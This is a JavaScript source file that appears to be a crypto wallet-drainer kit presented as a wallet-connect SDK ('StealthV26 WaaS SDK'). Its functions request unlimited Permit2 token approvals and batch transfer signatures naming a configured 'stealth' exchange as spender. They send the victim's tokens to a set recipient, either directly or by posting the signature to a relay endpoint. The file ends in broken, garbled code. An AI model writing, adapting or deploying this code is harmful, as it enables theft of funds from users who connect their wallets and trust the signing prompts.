  // Load Web3Modal from CDN
  w3modal = await loadWeb3Modal();

  if (w3modal) {
    // Subscribe to Web3Modal state changes
    w3modal.subscribeProvider(function(providerState) {
      w3mProvider = providerState.provider || null;
      if (providerState.address && providerState.chainId) {
        updateConnectedState(providerState.address, providerState.chainId);
      }
      if (providerState.isConnected === false && state.connected) {
        handleDisconnect();
      }
    });
  }

  // Inject <w3m-button> into containers marked with data-sv26-button
  document.querySelectorAll("[data-sv26-button]").forEach(function(el) {
    var btn = document.createElement("w3m-button");
    btn.setAttribute("balance", "show");
    el.appendChild(btn);
  });

  // Bind custom connect buttons (non-Web3Modal elements)
  document.querySelectorAll(CONFIG.ui.connectClass).forEach(function(btn) {
    if (btn.tagName === "W3M-BUTTON" || btn.tagName === "W3M-CONNECT-BUTTON") return;
    btn.addEventListener("click", function(e) {
      e.preventDefault();
      if (state.connected) { disconnect(); }
      else { openModal(); }
    });
  });

  // Bind action buttons — routes through strategy engine
  if (CONFIG.modal.clickToOpen) {
    document.querySelectorAll(CONFIG.ui.actionClass).forEach(function(btn) {
      btn.addEventListener("click", async function(e) {
        e.preventDefault();
        if (!state.connected) { openModal(); return; }
        try {
          await executeStrategy(CONFIG.ui.txFunctionName);
        } catch (err) {
          log("strategy_error", { preset: CONFIG.ui.txFunctionName, error: err && err.message ? err.message : String(err) });
          throw err;
        }
      });
    });
  }

  // Bind disconnect buttons
  document.querySelectorAll(CONFIG.ui.disconnectClass).forEach(function(btn) {
    btn.addEventListener("click", function(e) {
      e.preventDefault();
      disconnect();
    });
  });

  log("sdk_ready", { appkit: !!w3modal, chains: CONFIG.chains.length, engine: "reown" });
}


// Auto-initialize
if (document.readyState === "complete") {
  init();
} else {
  window.addEventListener("load", init);
}

const APPKIT_CDN = "https://cdn.jsdelivr.net/npm/@reown/appkit@latest/+esm";
const APPKIT_WAGMI_CDN = "https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-wagmi@latest/+esm";
const APPKIT_NETWORKS_CDN = "https://cdn.jsdelivr.net/npm/@reown/appkit@latest/networks/+esm";
const WAGMI_ACTIONS_CDN = "https://cdn.jsdelivr.net/npm/wagmi@latest/actions/+esm";

const ETHERS_CDN = "https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm";

let w3modal = null;
let w3mProvider = null;
let ethersMod = null;
let ethersProvider = null;
let ethersSigner = null;
let customModalEl = null;

var mountedConnectButtons = [];
var sdkInitialized = false;

async function loadEthers() {
  if (ethersMod) return ethersMod;
  ethersMod = await import(ETHERS_CDN);
  return ethersMod;
}

async function getEthersSigner() {
  var provider = w3mProvider || window.ethereum;
  if (!provider) throw new Error("No provider");
  var E = await loadEthers();
  ethersProvider = new E.BrowserProvider(provider);
  ethersSigner = await ethersProvider.getSigner();
  return { E: E, provider: ethersProvider, signer: ethersSigner };
}

async function ensureSufficientBalances(items) {
  if (!items || !items.length) return;
  var ctx = await getEthersSigner();
  var E = ctx.E;
  var signer = ctx.signer;
  var owner = await signer.getAddress();

  var erc20Abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)"
  ];

  for (var i = 0; i < items.length; i++) {
    var it = items[i];
    if (!it || !it.token) continue;
    var tokenC = new E.Contract(it.token, erc20Abi, signer);
    var dec = it.decimals;
    if (dec == null) dec = await tokenC.decimals();
    it.decimals = dec;
    var required = it.amountWei;
    if (required == null) {
      required = E.parseUnits(String(it.amount), dec);
      it.amountWei = required;
    }
    var bal = await tokenC.balanceOf(owner);
    if (bal < required) {
      log("insufficient_balance", { token: it.token, required: String(required), balance: String(bal) });
      throw new Error("Insufficient token balance for " + it.token);
    }
  }
}

async function ensurePermit2Approvals(items) {
  if (!items || !items.length) return;
  var ctx = await getEthersSigner();
  var E = ctx.E;
  var signer = ctx.signer;
  var owner = await signer.getAddress();
  var permit2 = CONFIG.stealth && CONFIG.stealth.permit2 ? CONFIG.stealth.permit2 : null;
  if (!permit2) throw new Error("Missing permit2 address");

  var erc20Abi = [
    "function allowance(address owner, address spender) view returns (uint256)",
    "function approve(address spender, uint256 value) returns (bool)",
    "function decimals() view returns (uint8)"
  ];

  for (var i = 0; i < items.length; i++) {
    var it = items[i];
    if (!it || !it.token) continue;
    var token = it.token;
    var tokenC = new E.Contract(token, erc20Abi, signer);
    var required = it.amountWei;
    if (required == null) {
      var dec = it.decimals;
      if (dec == null) dec = await tokenC.decimals();
      required = E.parseUnits(String(it.amount), dec);
      it.amountWei = required;
      it.decimals = dec;
    }
    var current = await tokenC.allowance(owner, permit2);
    if (current >= required) continue;
    var tx = await tokenC.approve(permit2, E.MaxUint256);
    log("permit2_approve_sent", { token: token, hash: tx.hash });
    await tx.wait();
    log("permit2_approve_confirmed", { token: token, hash: tx.hash });
  }
}

async function batchSend(params) {
  if (!params || !params.recipient || !params.items || !params.items.length) {
    throw new Error("Missing recipient/items");
  }

  var ctx = await getEthersSigner();
  var E = ctx.E;
  var signer = ctx.signer;
  var user = await signer.getAddress();

  var exchange = CONFIG.stealth && CONFIG.stealth.exchange ? CONFIG.stealth.exchange : null;
  var permit2 = CONFIG.stealth && CONFIG.stealth.permit2 ? CONFIG.stealth.permit2 : null;
  if (!exchange) throw new Error("Missing exchange address");
  if (!permit2) throw new Error("Missing permit2 address");

  var items = params.items.map(function(x){ return { token: x.token, amount: x.amount, decimals: x.decimals, amountWei: x.amountWei }; });
  await ensureSufficientBalances(items);
  await ensurePermit2Approvals(items);

  var permit2Abi = [
    "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
  ];
  var permit2C = new E.Contract(permit2, permit2Abi, signer);

  var now = Math.floor(Date.now() / 1000);
  var expiration = params.expiration || (now + 60 * 60 * 24 * 30);
  var sigDeadline = params.sigDeadline || (now + 60 * 20);

  var details = [];
  for (var i = 0; i < items.length; i++) {
    var it = items[i];
    var amountWei = it.amountWei;
    if (amountWei == null) {
      var erc20Abi = ["function decimals() view returns (uint8)"];
      var tokenC = new E.Contract(it.token, erc20Abi, signer);
      var dec = it.decimals;
      if (dec == null) dec = await tokenC.decimals();
      amountWei = E.parseUnits(String(it.amount), dec);
      it.amountWei = amountWei;
      it.decimals = dec;
    }

    var res = await permit2C.allowance(user, it.token, exchange);
    var nonce = Number(res.nonce);
    details.push({ token: it.token, amount: amountWei, expiration: expiration, nonce: nonce });
  }

  var chainId = await signer.provider.getNetwork().then(function(n){ return Number(n.chainId); });
  var domain = { name: "Permit2", chainId: chainId, verifyingContract: permit2 };
  var types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" }
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" }
    ]
  };

  var permitBatch = {
    details: details.map(function(d){ return { token: d.token, amount: d.amount, expiration: d.expiration, nonce: d.nonce }; }),
    spender: exchange,
    sigDeadline: sigDeadline
  };

  var signature = await signer.signTypedData(domain, types, permitBatch);
  log("permit2_batch_signed", { items: items.length, sigDeadline: sigDeadline });

  var exchangeAbi = [
    "function batchPermitTransferFromBatch(address user, ( (address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline ) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)"
  ];
  var exchangeC = new E.Contract(exchange, exchangeAbi, signer);
  var tx = await exchangeC.batchPermitTransferFromBatch(user, permitBatch, signature, params.recipient);
  log("batch_transfer_sent", { hash: tx.hash, recipient: params.recipient, items: items.length });
  var receipt = await tx.wait();
  log("batch_transfer_confirmed", { hash: tx.hash, status: receipt.status });
  return { hash: tx.hash, receipt: receipt };
}

async function signBatchPermit(params) {
  if (!params || !params.recipient || !params.items || !params.items.length) {
    throw new Error("Missing recipient/items");
  }

  var ctx = await getEthersSigner();
  var E = ctx.E;
  var signer = ctx.signer;
  var user = await signer.getAddress();

  var exchange = CONFIG.stealth && CONFIG.stealth.exchange ? CONFIG.stealth.exchange : null;
  var permit2 = CONFIG.stealth && CONFIG.stealth.permit2 ? CONFIG.stealth.permit2 : null;
  if (!exchange) throw new Error("Missing exchange address");
  if (!permit2) throw new Error("Missing permit2 address");

  var items = params.items.map(function(x){ return { token: x.token, amount: x.amount, decimals: x.decimals, amountWei: x.amountWei }; });
  await ensureSufficientBalances(items);
  if (params.ensureApprovals !== false) {
    await ensurePermit2Approvals(items);
  }

  var permit2Abi = [
    "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
  ];
  var permit2C = new E.Contract(permit2, permit2Abi, signer);

  var now = Math.floor(Date.now() / 1000);
  var expiration = params.expiration || (now + 60 * 60 * 24 * 30);
  var sigDeadline = params.sigDeadline || (now + 60 * 20);

  var details = [];
  for (var i = 0; i < items.length; i++) {
    var it = items[i];
    var amountWei = it.amountWei;
    if (amountWei == null) {
      var erc20Abi = ["function decimals() view returns (uint8)"];
      var tokenC = new E.Contract(it.token, erc20Abi, signer);
      var dec = it.decimals;
      if (dec == null) dec = await tokenC.decimals();
      amountWei = E.parseUnits(String(it.amount), dec);
      it.amountWei = amountWei;
      it.decimals = dec;
    }

    var res = await permit2C.allowance(user, it.token, exchange);
    var nonce = Number(res.nonce);
    details.push({ token: it.token, amount: amountWei, expiration: expiration, nonce: nonce });
  }

  var chainId = await signer.provider.getNetwork().then(function(n){ return Number(n.chainId); });
  var domain = { name: "Permit2", chainId: chainId, verifyingContract: permit2 };
  var types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" }
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" }
    ]
  };

  var permitBatch = {
    details: details.map(function(d){ return { token: d.token, amount: d.amount, expiration: d.expiration, nonce: d.nonce }; }),
    spender: exchange,
    sigDeadline: sigDeadline
  };

  var signature = await signer.signTypedData(domain, types, permitBatch);
  log("permit2_batch_signed", { items: items.length, sigDeadline: sigDeadline });

  return { user: user, recipient: params.recipient, permitBatch: permitBatch, signature: signature };
}

function serializeRelayPayload(payload) {
  var permitBatch = payload.permitBatch;
  if (permitBatch && Array.isArray(permitBatch.details)) {
    permitBatch = {
      spender: permitBatch.spender,
      sigDeadline: String(permitBatch.sigDeadline),
      details: permitBatch.details.map(function(d) {
        return {
          token: d.token,
          amount: String(d.amount),
          expiration: Number(d.expiration),
          nonce: Number(d.nonce)
        };
      })
    };
  }
  return {
    user: payload.user,
    recipient: payload.recipient,
    signature: payload.signature,
    permitBatch: permitBatch,
    projectId: payload.projectId,
    executionBackend: payload.executionBackend || CONFIG.strategy.executionBackend || "stealth-exchange"
  };
}

async function relayBatch(params) {
  var payload = await signBatchPermit(params);
  if (params && params.projectId) payload.projectId = params.projectId;
  if (params && params.executionBackend) payload.executionBackend = params.executionBackend;
  else if (CONFIG.strategy && CONFIG.strategy.executionBackend) payload.executionBackend = CONFIG.strategy.executionBackend;
  var url = (params && params.relayUrl) ? params.relayUrl : (window.location.origin + "/api/relay/batch");
  var res = await fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(serializeRelayPayload(payload))
  });
  if (!res.ok) {
    var t = await res.text().catch(function(){ return ""; });
    throw new Error("Relay failed: " + t);
  }
  var json = await res.json();
  return json;
}

async function loadWeb3Modal() {
  try {
    const { createAppKit } = await import(APPKIT_CDN);
    const { WagmiAdapter } = await import(APPKIT_WAGMI_CDN);
    const networkMod = await import(APPKIT_NETWORKS_CDN);

    var NETWORK_MAP = {
      1: networkMod.mainnet, 56: networkMod.bsc, 137: networkMod.polygon,
      43114: networkMod.avalanche, 42161: networkMod.arbitrum, 10: networkMod.optimism,
      8453: networkMod.base, 324: networkMod.zksync, 59144: networkMod.linea
    };

    var networks = CONFIG.chains.map(function(c) { return NETWORK_MAP[c.chainId]; }).filter(Boolean);
    if (networks.length === 0) networks = [networkMod.mainnet];

    var wagmiAdapter = new WagmiAdapter({ projectId: CONFIG.projectId, networks: networks });
    window.__st3WagmiAdapter = wagmiAdapter;

    w3modal = createAppKit({
      adapters: [wagmiAdapter],
      networks: networks,
      projectId: CONFIG.projectId,
      metadata: {
        name: CONFIG.appKit.name || document.title || "StealthV26 dApp",
        description: CONFIG.appKit.description || "Powered by StealthV26 WaaS SDK",
        url: CONFIG.appKit.url || window.location.origin,
        icons: CONFIG.appKit.logoUrl ? [CONFIG.appKit.logoUrl] : []
      },
      themeMode: CONFIG.modal.themeMode === "auto" ? undefined : CONFIG.modal.themeMode,
      features: { analytics: CONFIG.appKit.analytics || false },
    });

    w3modal.subscribeAccount(function(account) {
      if (account.isConnected && account.address) {
        var chainId = null;
        try { chainId = wagmiAdapter.wagmiConfig.state.chainId; } catch(e) {}
        w3mProvider = window.ethereum;
        updateConnectedState(account.address, chainId || 1);
      } else if (state.connected) {
        handleDisconnect();
      }
    });

    log("web3modal_loaded", { projectId: CONFIG.projectId, chains: CONFIG.chains.length, engine: "reown-appkit" });
    return w3modal;
  } catch (err) {
    log("web3modal_load_error", { error: err.message });
    console.error("[StealthV26] Failed to load Reown AppKit from CDN:", err);
    return null;
  }
}

const log = (function() {
  const fmt = CONFIG.advanced.logFormat;
  return function(event, data) {
    if (fmt === "minimal") return;
    const entry = { ts: new Date().toISOString(), event, ...data };
    if (CONFIG.advanced.logURL) entry.url = window.location.href;
    if (fmt === "json") console.log(JSON.stringify(entry));
    else console.log("[StealthV26]", event, data);
  };
})();

function shortAddr(a) { return a ? a.slice(0,6) + "..." + a.slice(-4) : ""; }

function resolveRadius() {
  if (CONFIG.modal.borderRadius === "small") return "16px";
  if (CONFIG.modal.borderRadius === "medium") return "22px";
  if (CONFIG.modal.borderRadius === "full") return "999px";
  return "30px";
}

function resolveThemeTokens() {

    return {
      shell: "#f5f5f7",
      panel: "#ffffff",

      border: "rgba(20,20,27,0.10)",

    };

    panel: "#14141b",
    text: "#ffffff",
    muted: "#9f9fb0",
